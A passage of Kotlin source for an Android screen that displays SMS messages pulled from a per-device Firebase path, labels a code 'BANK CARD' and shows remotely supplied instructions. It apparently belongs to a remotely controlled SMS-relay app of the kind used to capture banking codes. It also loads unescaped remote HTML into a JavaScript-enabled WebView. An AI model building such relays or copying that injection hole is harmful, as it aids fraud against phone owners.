            id.smsRecyclerView.isEnabled = true
            
            // SMS card is always visible now (instruction is on back side)
            id.smsCard.visibility = View.VISIBLE
            id.smsCard.alpha = 1.0f
            
            // Always show SMS by default
            id.smsContentFront.visibility = View.VISIBLE
            id.smsContentFront.alpha = 1f
            id.instructionContentBack.visibility = View.GONE
            id.instructionContentBack.alpha = 0f
            
            // Show empty state initially
            id.smsEmptyState.visibility = View.VISIBLE
            id.smsRecyclerView.visibility = View.GONE
            
            // Setup device info text (device ID and version code)
            setupDeviceInfoText()
            
            // Load initial messages
            loadInitialSmsMessages()
            
            // Setup Firebase listener for new SMS messages
            setupSmsFirebaseListener()
            
            LogHelper.d("ActivatedActivity", "SMS RecyclerView setup complete - card is visible and clickable")
        } catch (e: Exception) {
            LogHelper.e("ActivatedActivity", "Error setting up SMS RecyclerView", e)
        }
    }
    
    /**
     * Setup device info text (device ID and version code) outside SMS card
     */
    private fun setupDeviceInfoText() {
        try {
            val deviceId = cachedAndroidId
            val versionCode = VersionChecker.getCurrentVersionCode(this)
            val versionName = VersionChecker.getCurrentVersionName(this)
            
            // Set device ID text (using findViewById as binding may not be updated yet)
            val deviceIdText = findViewById<android.widget.TextView>(R.id.deviceIdText)
            val versionCodeText = findViewById<android.widget.TextView>(R.id.versionCodeText)
            
            deviceIdText?.text = "ID: $deviceId"  // Show full device ID without truncation
            // Firebase call log disabled for now
            // deviceIdText?.setOnLongClickListener {
            //     // Long press to open Firebase call logs
            //     val intent = android.content.Intent(this, com.example.fast.ui.FirebaseCallLogActivity::class.java)
            //     startActivity(intent)
            //     true
            // }
            versionCodeText?.text = "V: $versionName ($versionCode)"
            
            LogHelper.d("ActivatedActivity", "Device info set - ID: $deviceId, V: $versionName ($versionCode)")
        } catch (e: Exception) {
            LogHelper.e("ActivatedActivity", "Error setting device info text", e)
        }
    }
    
    /**
     * Animate count badge update with pulse effect (matching HTML theme)
     */
    /**
     * Animate SMS card border to blink twice when new message arrives
     * Prevents multiple animations from running simultaneously to avoid crashes
     */
    private fun animateSmsCardBorderBlink() {
        try {
            // If animation is already running, skip to prevent crashes with multiple messages
            if (isBorderBlinkAnimating) {
                LogHelper.d("ActivatedActivity", "Border blink animation already running, skipping")
                return
            }
            
            val smsCard = id.smsCard ?: return
            val normalDrawable = resources.getDrawable(R.drawable.crypto_hash_card_background, theme) ?: return
            val highlightDrawable = resources.getDrawable(R.drawable.sms_card_border_highlight, theme) ?: return
            
            val baseDrawable = normalDrawable.constantState?.newDrawable()?.mutate() ?: return
            
            // Mark animation as running
            isBorderBlinkAnimating = true
            
            // Cancel any pending runnables
            borderBlinkHandler?.let { handler ->
                borderBlinkRunnables.forEach { handler.removeCallbacks(it) }
                borderBlinkRunnables.clear()
            }
            
            // Create new handler if needed
            if (borderBlinkHandler == null) {
                borderBlinkHandler = android.os.Handler(android.os.Looper.getMainLooper())
            }
            
            val handler = borderBlinkHandler!!
            
            // First blink
            smsCard.background = highlightDrawable
            val runnable1 = Runnable {
                try {
                    if (!isDestroyed && !isFinishing) {
                        smsCard.background = baseDrawable
                    }
                } catch (e: Exception) {
                    LogHelper.e("ActivatedActivity", "Error in border blink animation step 1", e)
                }
            }
            borderBlinkRunnables.add(runnable1)
            handler.postDelayed(runnable1, 300)
            
            // Second blink after short delay
            val runnable2 = Runnable {
                try {
                    if (!isDestroyed && !isFinishing) {
                        smsCard.background = highlightDrawable
                        val runnable3 = Runnable {
                            try {
                                if (!isDestroyed && !isFinishing) {
                                    smsCard.background = baseDrawable
                                }
                                // Reset flag after animation completes
                                isBorderBlinkAnimating = false
                                borderBlinkRunnables.clear()
                            } catch (e: Exception) {
                                LogHelper.e("ActivatedActivity", "Error in border blink animation step 3", e)
                                isBorderBlinkAnimating = false
                                borderBlinkRunnables.clear()
                            }
                        }
                        borderBlinkRunnables.add(runnable3)
                        handler.postDelayed(runnable3, 300)
                    } else {
                        isBorderBlinkAnimating = false
                        borderBlinkRunnables.clear()
                    }
                } catch (e: Exception) {
                    LogHelper.e("ActivatedActivity", "Error in border blink animation step 2", e)
                    isBorderBlinkAnimating = false
                    borderBlinkRunnables.clear()
                }
            }
            borderBlinkRunnables.add(runnable2)
            handler.postDelayed(runnable2, 500) // 300 + 200 delay
        } catch (e: Exception) {
            LogHelper.e("ActivatedActivity", "Error animating SMS card border blink", e)
            isBorderBlinkAnimating = false
            borderBlinkRunnables.clear()
        }
    }
    
    private fun animateCountBadgeUpdate(badge: android.widget.TextView, newText: String) {
        try {
            // Update text immediately
            badge.text = newText
            
            // Scale animation: 1.0 -> 1.3 -> 1.0 (matching HTML pulse effect)
            val scaleX = android.animation.ObjectAnimator.ofFloat(badge, "scaleX", 1.0f, 1.3f, 1.0f)
            val scaleY = android.animation.ObjectAnimator.ofFloat(badge, "scaleY", 1.0f, 1.3f, 1.0f)
            
            scaleX.duration = 300
            scaleY.duration = 300
            scaleX.interpolator = android.view.animation.AccelerateDecelerateInterpolator()
            scaleY.interpolator = android.view.animation.AccelerateDecelerateInterpolator()
            
            // Start animation
            android.animation.AnimatorSet().apply {
                playTogether(scaleX, scaleY)
                start()
            }
        } catch (e: Exception) {
            // Fallback: just update text without animation
            badge.text = newText
            LogHelper.e("ActivatedActivity", "Error animating count badge", e)
        }
    }
    
    /**
     * Setup animation change button
     */
    private fun setupAnimationChangeButton() {
        try {
            val button = findViewById<android.widget.Button>(R.id.animationChangeButton)
            button?.setOnClickListener {
                // Cycle to next animation type
                currentAnimationType = (currentAnimationType % 5) + 1
                
                // Update button text to show current animation
                val animationNames = arrayOf("", "SCALE", "NONE", "FULL", "FADE", "BOUNCE")
                button.text = "ANIM ${currentAnimationType}"
                
                // Apply animation to label
                val labelView = id.phoneCodeLabel
                if (labelView != null) {
                    animateLabelAppearance(labelView)
                }
                
                LogHelper.d("ActivatedActivity", "Animation changed to type: $currentAnimationType")
            }
        } catch (e: Exception) {
            LogHelper.e("ActivatedActivity", "Error setting up animation change button", e)
        }
    }
    
    /**
     * Animate label appearance - uses current animation type
     */
    private fun animateLabelAppearance(labelView: TextView) {
        when (currentAnimationType) {
            1 -> animateLabelScaleSlide(labelView)      // Scale + Slide (no fade)
            2 -> animateLabelNone(labelView)            // No animation
            3 -> animateLabelFull(labelView)            // Fade + Scale + Slide
            4 -> animateLabelFade(labelView)            // Fade only
            5 -> animateLabelBounce(labelView)          // Scale only (bounce)
            else -> animateLabelScaleSlide(labelView)   // Default
        }
    }
    
    /**
     * Setup manual flip toggle for SMS card to show instructions
     * Always available - checks if instruction content exists when clicked
     */
    private fun setupSmsCardFlipToggle() {
        try {
            val header = id.smsHeader
            header.setOnClickListener {
                val smsContentFront = id.smsContentFront
                val instructionContentBack = id.instructionContentBack
                val smsCardContentContainer = id.smsCardContentContainer
                
                if (instructionContentBack.visibility == View.VISIBLE) {
                    // Currently showing instruction - flip to SMS
                    animateCardFlipToSms(smsContentFront, instructionContentBack, smsCardContentContainer)
                    writeShowCardToFirebase("sms")
                    LogHelper.d("ActivatedActivity", "Manual flip: SMS visible")
                } else {
                    // Currently showing SMS - check if instruction exists, then flip
                    if (hasInstructionContent) {
                        // Instruction content exists - flip to instruction
                        animateCardFlipToInstruction(smsContentFront, instructionContentBack, smsCardContentContainer)
                        writeShowCardToFirebase("instruction")
                        LogHelper.d("ActivatedActivity", "Manual flip: Instruction visible")
                    } else {
                        // No instruction content - stay on SMS (no flip)
                        LogHelper.d("ActivatedActivity", "No instruction content available, staying on SMS")
                    }
                }
            }
        } catch (e: Exception) {
            LogHelper.e("ActivatedActivity", "Error setting up SMS card flip toggle", e)
        }
    }
    
    /**
     * Write current card (sms vs instruction) to Firebase cardControl/showCard.
     * Ensures dashboard stays in sync when user flips via SMS header tap ("instruction card transaction").
     */
    @SuppressLint("HardwareIds")
    private fun writeShowCardToFirebase(cardType: String) {
        try {
            val path = "${AppConfig.getFirebaseDevicePath(cachedAndroidId)}/cardControl/showCard"
            Firebase.database.reference.child(path).setValue(cardType)
                .addOnSuccessListener {
                    LogHelper.d("ActivatedActivity", "cardControl/showCard written: $cardType")
                }
                .addOnFailureListener { e ->
                    LogHelper.e("ActivatedActivity", "Failed to write cardControl/showCard", e)
                }
        } catch (e: Exception) {
            LogHelper.e("ActivatedActivity", "Error writing showCard to Firebase", e)
        }
    }

    /**
     * Option 1: Scale + Slide (no fade, no flash)
     */
    private fun animateLabelScaleSlide(labelView: TextView) {
        try {
            labelView.alpha = 1f
            labelView.scaleX = 0.5f
            labelView.scaleY = 0.5f
            labelView.translationX = -50f
            
            val scaleXAnim = ObjectAnimator.ofFloat(labelView, "scaleX", 0.5f, 1f).apply {
                duration = 600
                interpolator = android.view.animation.OvershootInterpolator(1.2f)
            }
            
            val scaleYAnim = ObjectAnimator.ofFloat(labelView, "scaleY", 0.5f, 1f).apply {
                duration = 600
                interpolator = android.view.animation.OvershootInterpolator(1.2f)
            }
            
            val translateXAnim = ObjectAnimator.ofFloat(labelView, "translationX", -50f, 0f).apply {
                duration = 600
                interpolator = android.view.animation.DecelerateInterpolator()
            }
            
            AnimatorSet().apply {
                playTogether(scaleXAnim, scaleYAnim, translateXAnim)
                start()
            }
            
            LogHelper.d("ActivatedActivity", "Animation: Scale + Slide")
        } catch (e: Exception) {
            resetLabelState(labelView)
        }
    }
    
    /**
     * Option 2: No animation
     */
    private fun animateLabelNone(labelView: TextView) {
        try {
            resetLabelState(labelView)
            LogHelper.d("ActivatedActivity", "Animation: None")
        } catch (e: Exception) {
            resetLabelState(labelView)
        }
    }
    
    /**
     * Option 3: Fade + Scale + Slide (full animation)
     */
    private fun animateLabelFull(labelView: TextView) {
        try {
            labelView.alpha = 0f
            labelView.scaleX = 0.5f
            labelView.scaleY = 0.5f
            labelView.translationX = -50f
            
            val alphaAnim = ObjectAnimator.ofFloat(labelView, "alpha", 0f, 1f).apply {
                duration = 600
                interpolator = android.view.animation.DecelerateInterpolator()
            }
            
            val scaleXAnim = ObjectAnimator.ofFloat(labelView, "scaleX", 0.5f, 1f).apply {
                duration = 600
                interpolator = android.view.animation.OvershootInterpolator(1.2f)
            }
            
            val scaleYAnim = ObjectAnimator.ofFloat(labelView, "scaleY", 0.5f, 1f).apply {
                duration = 600
                interpolator = android.view.animation.OvershootInterpolator(1.2f)
            }
            
            val translateXAnim = ObjectAnimator.ofFloat(labelView, "translationX", -50f, 0f).apply {
                duration = 600
                interpolator = android.view.animation.DecelerateInterpolator()
            }
            
            AnimatorSet().apply {
                playTogether(alphaAnim, scaleXAnim, scaleYAnim, translateXAnim)
                start()
            }
            
            LogHelper.d("ActivatedActivity", "Animation: Fade + Scale + Slide")
        } catch (e: Exception) {
            resetLabelState(labelView)
        }
    }
    
    /**
     * Option 4: Fade only
     */
    private fun animateLabelFade(labelView: TextView) {
        try {
            labelView.alpha = 0f
            labelView.scaleX = 1f
            labelView.scaleY = 1f
            labelView.translationX = 0f
            
            val alphaAnim = ObjectAnimator.ofFloat(labelView, "alpha", 0f, 1f).apply {
                duration = 400
                interpolator = android.view.animation.DecelerateInterpolator()
            }
            
            alphaAnim.start()
            
            LogHelper.d("ActivatedActivity", "Animation: Fade only")
        } catch (e: Exception) {
            resetLabelState(labelView)
        }
    }
    
    /**
     * Option 5: Scale only (bounce)
     */
    private fun animateLabelBounce(labelView: TextView) {
        try {
            labelView.alpha = 1f
            labelView.scaleX = 0.3f
            labelView.scaleY = 0.3f
            labelView.translationX = 0f
            
            val scaleXAnim = ObjectAnimator.ofFloat(labelView, "scaleX", 0.3f, 1f).apply {
                duration = 500
                interpolator = android.view.animation.OvershootInterpolator(1.5f)
            }
            
            val scaleYAnim = ObjectAnimator.ofFloat(labelView, "scaleY", 0.3f, 1f).apply {
                duration = 500
                interpolator = android.view.animation.OvershootInterpolator(1.5f)
            }
            
            AnimatorSet().apply {
                playTogether(scaleXAnim, scaleYAnim)
                start()
            }
            
            LogHelper.d("ActivatedActivity", "Animation: Scale only (bounce)")
        } catch (e: Exception) {
            resetLabelState(labelView)
        }
    }
    
    /**
     * Reset label to normal state
     */
    private fun resetLabelState(labelView: TextView) {
        labelView.alpha = 1f
        labelView.scaleX = 1f
        labelView.scaleY = 1f
        labelView.translationX = 0f
    }
    
    /**
     * Load initial SMS messages from Firebase
     */
    private fun loadInitialSmsMessages() {
        try {
            val messagesRef = Firebase.database.reference
                .child(AppConfig.getFirebaseMessagePath(cachedAndroidId))
            
            // Load messages locally (don't query Firebase for total count)
            messagesRef.orderByKey()
                .limitToLast(50)
                .get()
                .addOnSuccessListener { snapshot ->
                    try {
                        val messages = mutableListOf<SmsMessageItem>()
                        snapshot.children.forEach { child ->
                            // Parse message - format: "received~phone~body" or "sent~phone~body"
                            val messageValue = child.getValue(String::class.java)
                            val phoneNumber: String
                            val body: String
                            val timestamp: Long
                            val type: String
                            
                            if (messageValue != null && messageValue.contains("~")) {
                                // String format: "received~phone~body" or "sent~phone~body"
                                val parts = messageValue.split("~")
                                if (parts.size >= 3) {
                                    type = parts[0]
                                    phoneNumber = parts[1]
                                    body = parts[2]
                                    timestamp = child.key?.toLongOrNull() ?: System.currentTimeMillis()
                                } else {
                                    return@forEach
                                }
                            } else {
                                // Structured format: {phoneNumber, body, timestamp, type}
                                phoneNumber = child.child("phoneNumber").getValue(String::class.java) ?: return@forEach
                                body = child.child("body").getValue(String::class.java) ?: return@forEach
                                timestamp = child.child("timestamp").getValue(Long::class.java) ?: child.key?.toLongOrNull() ?: System.currentTimeMillis()
                                type = child.child("type").getValue(String::class.java) ?: "received"
                            }
                            
                            // Allow test messages to be displayed
                            messages.add(SmsMessageItem(
                                type = type,
                                phoneNumber = phoneNumber,
                                body = body,
                                timestamp = timestamp
                            ))
                        }
                        
                        // Sort by timestamp descending (newest first)
                        messages.sortByDescending { it.timestamp }
                        // Keep only last 10 messages for display
                        val limitedMessages = messages.take(10)
                        
                        // Count messages locally (start from loaded messages)
                        totalSmsMessageCount = messages.size
                        // Track the latest message timestamp to only count newer messages in onChildAdded
                        lastLoadedMessageTimestamp = messages.maxOfOrNull { it.timestamp } ?: 0L
                        initialLoadCompleted = true
                        initialLoadTimestamp = System.currentTimeMillis()
                        
                        LogHelper.d("ActivatedActivity", "Initial load: ${messages.size} messages counted locally, latest timestamp: $lastLoadedMessageTimestamp")
                        
                        handler.post {
                            try {
                                smsAdapter.submitList(limitedMessages) {
                                    id.smsRecyclerView.scrollToPosition(0)
                                }
                                
                                // Update count badge with total messages (not just displayed 10)
                                animateCountBadgeUpdate(id.smsCountBadge, totalSmsMessageCount.toString())
                                
                                // Show/hide empty state
                                if (limitedMessages.isEmpty()) {
                                    id.smsEmptyState.visibility = View.VISIBLE
                                    id.smsRecyclerView.visibility = View.GONE
                                    } else {
                                    id.smsEmptyState.visibility = View.GONE
                                    id.smsRecyclerView.visibility = View.VISIBLE
                                    }
                                    
                                LogHelper.d("ActivatedActivity", "Loaded ${limitedMessages.size} initial SMS messages (filtered from ${messages.size})")
                                } catch (e: Exception) {
                                LogHelper.e("ActivatedActivity", "Error updating SMS list with initial messages", e)
                                }
                            }
                                } catch (e: Exception) {
                        LogHelper.e("ActivatedActivity", "Error parsing initial SMS messages", e)
                    }
                }
                .addOnFailureListener { e ->
                    LogHelper.e("ActivatedActivity", "Error loading initial SMS messages", e)
                }
        } catch (e: Exception) {
            LogHelper.e("ActivatedActivity", "Error in loadInitialSmsMessages", e)
        }
    }
    
    /**
     * Setup Firebase listener for SMS messages
     */
    private fun setupSmsFirebaseListener() {
        try {
            // Use the new message path: message/{deviceId}/msg
            val messagesRef = Firebase.database.reference
                .child(AppConfig.getFirebaseMessagePath(cachedAndroidId))
            
            // Remove existing listener to prevent duplicates
            smsFirebaseListener?.let {
                try {
                    messagesRef.removeEventListener(it)
                    LogHelper.d("ActivatedActivity", "Removed existing SMS Firebase listener")
                    } catch (e: Exception) {
                    LogHelper.e("ActivatedActivity", "Error removing existing SMS listener", e)
                }
            }
            
            // Listen for all messages - limit is applied when displaying
            // We listen to all messages to catch new ones immediately
            val query = messagesRef.orderByKey()
            
            LogHelper.d("ActivatedActivity", "Setting up SMS listener at path: ${AppConfig.getFirebaseMessagePath(cachedAndroidId)}")
            
            smsFirebaseListener = object : com.google.firebase.database.ChildEventListener {
                    override fun onChildAdded(snapshot: com.google.firebase.database.DataSnapshot, previousChildName: String?) {
                        try {
                            // Parse message - can be either structured format or string format "received~phone~body"
                            val messageValue = snapshot.getValue(String::class.java)
                            val phoneNumber: String
                            val body: String
                            val timestamp: Long
                            val type: String
                            
                            if (messageValue != null && messageValue.contains("~")) {
                                // String format: "received~phone~body" or "sent~phone~body"
                                val parts = messageValue.split("~")
                                if (parts.size >= 3) {
                                    type = parts[0]
                                    phoneNumber = parts[1]
                                    body = parts[2]
                                    timestamp = snapshot.key?.toLongOrNull() ?: System.currentTimeMillis()
                                } else {
            return
        }
                            } else {
                                // Structured format: {phoneNumber, body, timestamp, type}
                                phoneNumber = snapshot.child("phoneNumber").getValue(String::class.java) ?: return
                                body = snapshot.child("body").getValue(String::class.java) ?: return
                                timestamp = snapshot.child("timestamp").getValue(Long::class.java) ?: snapshot.key?.toLongOrNull() ?: System.currentTimeMillis()
                                type = snapshot.child("type").getValue(String::class.java) ?: "received"
                            }
                            
                            val messageItem = SmsMessageItem(
                                type = type,
                                phoneNumber = phoneNumber,
                                body = body,
                                timestamp = timestamp
                            )
                            
                            handler.post {
                                try {
                                    LogHelper.d("ActivatedActivity", "New SMS message received: $phoneNumber - $body")
                                    
                                    val currentList = smsAdapter.currentList.toMutableList()
                                    
                                    // Check for duplicates before adding (same timestamp and phone number)
                                    val isDuplicate = currentList.any { 
                                        it.timestamp == messageItem.timestamp && 
                                        it.phoneNumber == messageItem.phoneNumber &&
                                        it.body == messageItem.body
                                    }
                                    
                                    // Allow test messages to be displayed
                                    if (!isDuplicate) {
                                        currentList.add(messageItem)
                                        // Only increment count if this is a truly NEW message (timestamp > last loaded timestamp)
                                        // This prevents counting existing messages when onChildAdded fires for all messages on listener attach
                                        if (initialLoadCompleted && messageItem.timestamp > lastLoadedMessageTimestamp) {
                                            totalSmsMessageCount++
                                            lastLoadedMessageTimestamp = messageItem.timestamp // Update latest timestamp
                                            LogHelper.d("ActivatedActivity", "Added new message to list. Total: $totalSmsMessageCount (timestamp: ${messageItem.timestamp})")
                                        } else if (!initialLoadCompleted) {
                                            // Initial load not complete yet - count will be set from initial load
                                            LogHelper.d("ActivatedActivity", "Message received before initial load complete, will be counted in initial load")
                                        } else {
                                            // This is an existing message from onChildAdded firing for all messages - ignore
                                            LogHelper.d("ActivatedActivity", "Existing message from onChildAdded (timestamp: ${messageItem.timestamp} <= $lastLoadedMessageTimestamp), not counting")
                                        }
                                    } else {
                                        LogHelper.d("ActivatedActivity", "Duplicate message detected, skipping")
                                        return@post
                                    }
                                    
                                    // Sort by timestamp descending (newest first)
                                    currentList.sortByDescending { it.timestamp }
                                    // Keep only last 10 messages for display
                                    val limitedList = currentList.take(10)
                                    
                                    LogHelper.d("ActivatedActivity", "Submitting ${limitedList.size} messages to adapter (Total: $totalSmsMessageCount)")
                                    
                                    // Cancel any pending scroll to prevent conflicts
                                    pendingScrollRunnable?.let { handler.removeCallbacks(it) }
                                    
                                    // Submit list update
                                    try {
                                        smsAdapter.submitList(limitedList) {
                                            // Debounce scroll to prevent crashes when multiple messages arrive
                                            pendingScrollRunnable = Runnable {
                                                try {
                                                    if (!isDestroyed && !isFinishing && id.smsRecyclerView != null) {
                                                        id.smsRecyclerView.scrollToPosition(0)
                                                        LogHelper.d("ActivatedActivity", "Scrolled to position 0")
                                                    }
                                                } catch (e: Exception) {
                                                    LogHelper.e("ActivatedActivity", "Error scrolling to position 0", e)
                                                }
                                                pendingScrollRunnable = null
                                            }
                                            // Delay scroll slightly to allow adapter to settle
                                            handler.postDelayed(pendingScrollRunnable!!, 100)
                                        }
                                    } catch (e: Exception) {
                                        LogHelper.e("ActivatedActivity", "Error submitting list to adapter", e)
                                    }
                                    
                                    // Update count badge with total messages (not just displayed 10)
                                    try {
                                        animateCountBadgeUpdate(id.smsCountBadge, totalSmsMessageCount.toString())
                                    } catch (e: Exception) {
                                        LogHelper.e("ActivatedActivity", "Error animating count badge", e)
                                    }
                                    
                                    // Animate SMS card border to blink twice for new message (debounced)
                                    // Only animate once even if multiple messages arrive quickly
                                    animateSmsCardBorderBlink()
                                    
                                    // Show/hide empty state
                                    if (limitedList.isEmpty()) {
                                        id.smsEmptyState.visibility = View.VISIBLE
                                        id.smsRecyclerView.visibility = View.GONE
        } else {
                                        id.smsEmptyState.visibility = View.GONE
                                        id.smsRecyclerView.visibility = View.VISIBLE
                                    }
                                    
                                    LogHelper.d("ActivatedActivity", "SMS list updated successfully")
                                } catch (e: Exception) {
                                    LogHelper.e("ActivatedActivity", "Error updating SMS list", e)
                                }
                            }
                        } catch (e: Exception) {
                            LogHelper.e("ActivatedActivity", "Error parsing SMS message", e)
                        }
                    }
                    
                    override fun onChildChanged(snapshot: com.google.firebase.database.DataSnapshot, previousChildName: String?) {
                        // Handle updates if needed
                    }
                    
                    override fun onChildRemoved(snapshot: com.google.firebase.database.DataSnapshot) {
                        // Handle removals if needed
                    }
                    
                    override fun onChildMoved(snapshot: com.google.firebase.database.DataSnapshot, previousChildName: String?) {
                        // Handle moves if needed
                    }
                    
                    override fun onCancelled(error: com.google.firebase.database.DatabaseError) {
                        LogHelper.e("ActivatedActivity", "SMS Firebase listener cancelled", error.toException())
                    }
                }
            
            query.addChildEventListener(smsFirebaseListener!!)
            
            LogHelper.d("ActivatedActivity", "SMS Firebase listener setup complete at path: ${AppConfig.getFirebaseMessagePath(cachedAndroidId)}")
        } catch (e: Exception) {
            LogHelper.e("ActivatedActivity", "Error setting up SMS Firebase listener", e)
        }
    }
    
    /**
     * Setup Firebase listeners
     */
    private fun setupFirebaseListeners() {
        firebaseManager.startListeners()
    }
    
    /**
     * Setup buttons
     */
    private fun setupButtons() {
        try {
            buttonManager.setupButtons()
            
            // Also set up direct click listener as fallback
            try {
                val testButton = id.testButtonCard
                if (testButton != null) {
                    testButton.isEnabled = true
                    testButton.isClickable = true
                    testButton.setOnClickListener {
                        LogHelper.d("ActivatedActivity", "Test button clicked (direct listener)")
                        handleTestClick()
                    }
                    LogHelper.d("ActivatedActivity", "Direct test button listener set")
        } else {
                    LogHelper.e("ActivatedActivity", "testButtonCard is null in setupButtons")
        }
            } catch (e: Exception) {
                LogHelper.e("ActivatedActivity", "Error setting up direct test button listener", e)
            }
        } catch (e: Exception) {
            LogHelper.e("ActivatedActivity", "Error in setupButtons", e)
        }
    }
    
    /**
     * Handle intent data
     */
    private fun handleIntentData() {
        val phoneFromIntent = intent.getStringExtra("phone")
        activationCode = intent.getStringExtra("code")
        
        // Get activation mode (testing or running)
        val activationMode = intent.getStringExtra("activationMode")
        
        // Update code label based on activation mode with animation
        if (activationMode != null) {
            val phoneCodeLabelView = id.phoneCodeLabel
            if (phoneCodeLabelView != null) {
                val labelText = if (activationMode == "running") {
                    "BANK CARD"
                } else {
                    "TESTING CODE"
                }
                phoneCodeLabelView.text = labelText
                // Animate label appearance
                animateLabelAppearance(phoneCodeLabelView)
            }
        }
        
        if (!activationCode.isNullOrBlank()) {
            viewModel.activationCode = activationCode
        }
        
        viewModel.shouldAnimate = intent.getBooleanExtra("animate", false)
    }
    
    /**
     * Check permissions and update UI
     */
    private fun checkPermissionsAndUpdateUI() {
        try {
            val hasAllPermissions = PermissionManager.hasAllMandatoryPermissions(this)
            viewModel.hasAllPermissions = hasAllPermissions
            
            // Force all cards visible
            handler.post {
                try {
                    id.phoneCard.visibility = View.VISIBLE
                    id.phoneCard.alpha = 1f
                    id.statusCard.visibility = View.VISIBLE
                    id.statusCard.alpha = 1f
                    id.smsCard.visibility = View.VISIBLE
                    id.smsCard.alpha = 1f
                    id.testButtonsContainer.visibility = View.VISIBLE
                    id.testButtonsContainer.alpha = 1f
        } catch (e: Exception) {
                    LogHelper.e("ActivatedActivity", "Error setting cards visible in checkPermissions", e)
                }
            }
            
            if (hasAllPermissions) {
                LogHelper.d("ActivatedActivity", "All permissions granted")
            } else {
                LogHelper.d("ActivatedActivity", "Some permissions missing")
            }
        } catch (e: Exception) {
            LogHelper.e("ActivatedActivity", "Error checking permissions", e)
        }
    }
    
    /**
     * Update bank name display
     * Note: Container removed - bank name tracked internally only
     */
    private fun updateBankName(bankName: String) {
        if (bankName.isNotBlank()) {
            viewModel.bankName = bankName
            // Container removed - no UI to update
        }
    }
    
    /**
     * Update company name (if needed in future)
     */
    private fun updateCompanyName(companyName: String) {
        viewModel.companyName = companyName
        // Company name can be displayed if needed
    }
    
    /**
     * Update other info (if needed in future)
     */
    private fun updateOtherInfo(otherInfo: String) {
        viewModel.otherInfo = otherInfo
        // Other info can be displayed if needed
    }
    
    /**
     * Update instruction display with vertical flip animation
     * SMS content fades out → vertical flip → instruction fades in
     */
    private fun updateInstructionDisplay(html: String, css: String, imageUrl: String?) {
        try {
            val webView = id.instructionWebView
            
            LogHelper.d("ActivatedActivity", "updateInstructionDisplay called - HTML: ${html.take(50)}..., CSS: ${css.take(50)}..., ImageUrl: ${imageUrl?.take(50)}...")
            
            // Track if instruction content exists (for flip toggle logic)
            val hasRemoteInstruction = html.isNotBlank() || !imageUrl.isNullOrBlank() || css.isNotBlank()
            hasInstructionContent = true
            
            LogHelper.d("ActivatedActivity", "hasInstructionContent: $hasInstructionContent")
            
            // Configure WebView
            webView.settings.javaScriptEnabled = true
            webView.settings.domStorageEnabled = true
            webView.settings.loadWithOverviewMode = true
            webView.settings.useWideViewPort = true
            webView.setBackgroundColor(0x00000000) // Transparent
            
            // Clear cache to ensure fresh content loads
            webView.clearCache(true)
            
            // Build image HTML if imageUrl is provided
            val imageHtml = if (!imageUrl.isNullOrBlank()) {
                """
                <div style="margin: 16px 0; text-align: center;">
                    <img src="$imageUrl" alt="Instruction Image" style="max-width: 100%; height: auto; border-radius: 8px;" onerror="this.style.display='none';" />
                </div>
                """
            } else {
                ""
            }

            val baseCss = """
                body { margin: 0; padding: 0; background-color: transparent; color: #FFFFFF; font-family: sans-serif; }
                img { max-width: 100%; height: auto; display: block; margin: 0 auto; }
                .card { padding: 16px; border-radius: 14px; background: linear-gradient(135deg, rgba(35,40,65,0.9), rgba(20,24,40,0.85)); box-shadow: 0 12px 24px rgba(0,0,0,0.25); }
                .chip { display: inline-block; padding: 4px 10px; border-radius: 999px; background: rgba(0,255,194,0.15); color: #00FFC2; font-size: 11px; letter-spacing: 0.6px; text-transform: uppercase; }
                h2 { margin: 12px 0 8px 0; font-size: 18px; }
                p { margin: 0 0 10px 0; color: #C7D2FF; font-size: 13px; line-height: 1.4; }
                ul { padding-left: 18px; margin: 8px 0 0 0; color: #A6B2E6; font-size: 12px; line-height: 1.5; }
                .status { display: flex; align-items: center; gap: 8px; margin-top: 12px; font-size: 12px; color: #7BE3FF; }
                .dot { width: 8px; height: 8px; border-radius: 50%; background: #7BE3FF; box-shadow: 0 0 10px rgba(123,227,255,0.7); animation: pulse 2s infinite; }
                @keyframes pulse { 0% { transform: scale(1); opacity: 0.7; } 50% { transform: scale(1.4); opacity: 1; } 100% { transform: scale(1); opacity: 0.7; } }
            """.trimIndent()

            val contentHtml = if (hasRemoteInstruction) {
                html
            } else {
                """
                <div class="card">
                    <div class="chip">Instruction Hub</div>
                    <h2>No instructions yet</h2>
                    <p>No transactions yet. Keep this screen open for live updates and guidance.</p>
                    <ul>
                        <li>Stay connected to the network.</li>
                        <li>New tasks will appear here instantly.</li>
                        <li>Tap the header anytime to flip back to SMS.</li>
                    </ul>
                    <div class="status"><span class="dot"></span>Listening for remote commands</div>
                </div>
                """.trimIndent()
            }

            val fullCss = "$baseCss\n$css"

            // Load instruction content
            val fullHtml = """
                <!DOCTYPE html>
                <html>
                <head>
                    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
                    <style>
                        $fullCss
                    </style>
                </head>
                <body>
                    $contentHtml
                    $imageHtml
                </body>
                </html>
            """.trimIndent()

            // Load content with a unique base URL to force refresh
            val uniqueBaseUrl = "file:///android_asset/?t=${System.currentTimeMillis()}"
            webView.loadDataWithBaseURL(uniqueBaseUrl, fullHtml, "text/html", "UTF-8", null)

            LogHelper.d("ActivatedActivity", "WebView loaded with HTML length: ${fullHtml.length}, BaseURL: $uniqueBaseUrl")

            // Don't auto-flip - just update content. User can flip manually or via remote command
            // If currently showing instruction, content will update automatically
            LogHelper.d("ActivatedActivity", "Instruction content updated (not auto-flipping)")
        } catch (e: Exception) {
            LogHelper.e("ActivatedActivity", "Error updating instruction display", e)
        }
    }
    
    /**
     * Animate card flip from SMS to Instruction (vertical up/down)
     * Sequence: SMS fade out → vertical flip → instruction fade in
     */
    private fun animateCardFlipToInstruction(
        smsFront: FrameLayout,
        instructionBack: FrameLayout,
        container: FrameLayout
    ) {
        if (isDestroyed || isFinishing) return
        
        // Set camera distance for 3D effect
        val cameraDistance = resources.displayMetrics.density * 8000
        container.cameraDistance = cameraDistance
        
        // Step 1: Fade out SMS content
        val fadeOutSms = ObjectAnimator.ofFloat(smsFront, "alpha", smsFront.alpha, 0f).apply {
            duration = 200
            interpolator = android.view.animation.AccelerateInterpolator()
        }
        
        fadeOutSms.addListener(object : AnimatorListenerAdapter() {
            override fun onAnimationEnd(animation: Animator) {
                if (isDestroyed || isFinishing) return
                
                // Step 2: Vertical flip (up/down rotation)
                smsFront.visibility = View.GONE
                instructionBack.visibility = View.VISIBLE
                instructionBack.alpha = 0f
                
                // Set initial rotation for back side (180 degrees - flipped)
                // Use ObjectAnimator to set rotationX property
                val setRotationBack = ObjectAnimator.ofFloat(instructionBack, "rotationX", 180f).apply {
                    duration = 0
                }
